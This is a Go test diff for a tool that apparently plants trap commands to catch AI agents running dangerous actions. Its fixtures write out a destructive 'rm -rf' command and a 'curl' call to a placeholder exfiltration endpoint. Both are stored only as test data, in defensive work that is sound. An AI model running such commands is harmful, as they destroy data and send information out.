@@ -144,6 +144,86 @@ func TestHasActiveTrapFiles(t *testing.T) {
 	}
 }
 
+func TestReadAllActiveTrapFiles(t *testing.T) {
+	setupTestTrapDir(t)
+
+	// Write two traps
+	trap1 := &ActiveTrap{
+		ID:          "trap_active_1",
+		TrapCommand: "rm -rf /tmp/.aegis-trap-test",
+		TemplateID:  "rm-rf",
+		Category:    "destructive",
+		Severity:    "critical",
+		InjectedAt:  time.Now(),
+	}
+	trap2 := &ActiveTrap{
+		ID:          "trap_active_2",
+		TrapCommand: "curl http://0.0.0.0:9999/exfil",
+		TemplateID:  "exfil",
+		Category:    "exfiltration",
+		Severity:    "high",
+		InjectedAt:  time.Now(),
+	}
+
+	if err := WriteTrapFile(trap1); err != nil {
+		t.Fatalf("WriteTrapFile: %v", err)
+	}
+	if err := WriteTrapFile(trap2); err != nil {
+		t.Fatalf("WriteTrapFile: %v", err)
+	}
+
+	files, err := ReadAllActiveTrapFiles()
+	if err != nil {
+		t.Fatalf("ReadAllActiveTrapFiles: %v", err)
+	}
+
+	if len(files) != 2 {
+		t.Fatalf("got %d files, want 2", len(files))
+	}
+
+	// Verify fields are populated
+	found := false
+	for _, f := range files {
+		if f.ID == "trap_active_1" {
+			found = true
+			if f.TrapCommand != "rm -rf /tmp/.aegis-trap-test" {
+				t.Errorf("TrapCommand = %q, want %q", f.TrapCommand, "rm -rf /tmp/.aegis-trap-test")
+			}
+			if f.Category != "destructive" {
+				t.Errorf("Category = %q, want %q", f.Category, "destructive")
+			}
+		}
+	}
+	if !found {
+		t.Error("trap_active_1 not found in results")
+	}
+}
+
+func TestReadAllActiveTrapFiles_Empty(t *testing.T) {
+	setupTestTrapDir(t)
+
+	files, err := ReadAllActiveTrapFiles()
+	if err != nil {
+		t.Fatalf("ReadAllActiveTrapFiles: %v", err)
+	}
+	if len(files) != 0 {
+		t.Errorf("got %d files, want 0", len(files))
+	}
+}
+
+func TestReadAllActiveTrapFiles_NoDir(t *testing.T) {
+	dir := t.TempDir()
+	t.Setenv("HOME", dir)
+
+	files, err := ReadAllActiveTrapFiles()
+	if err != nil {
+		t.Fatalf("ReadAllActiveTrapFiles: %v", err)
+	}
+	if files != nil {
+		t.Errorf("expected nil, got %v", files)
+	}
+}
+
 func TestCleanStaleTrapFiles_NoDir(t *testing.T) {
 	// Point HOME to a temp dir without .agentsaegis/traps
 	dir := t.TempDir()
